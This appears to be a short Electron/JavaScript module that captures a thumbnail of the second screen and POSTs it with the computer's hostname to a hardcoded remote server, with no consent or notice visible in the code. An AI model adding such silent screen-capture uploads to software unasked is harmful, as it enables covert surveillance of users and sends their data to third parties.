/* eslint-disable no-console */
import { desktopCapturer } from 'electron';
import os from 'os';
// import fs from 'fs';
import fetchData from '../fetchData';

const screenSender = () => {
  desktopCapturer
    .getSources({
      types: ['screen'],
      thumbnailSize: { height: 300, width: 400 },
    })
    .then(async (sources) => {
      // fs.writeFileSync('123.png', sources[1].thumbnail.toPNG());
      if (sources.length > 1)
        fetchData('http://5a.ml2.me:9555/api/v1/screen', 'POST', {
          name: os.hostname(),
          screen: sources[1].thumbnail.toPNG(),
        });

      return 0;
    })
    .catch((err) => console.log(err));
};

export default screenSender;
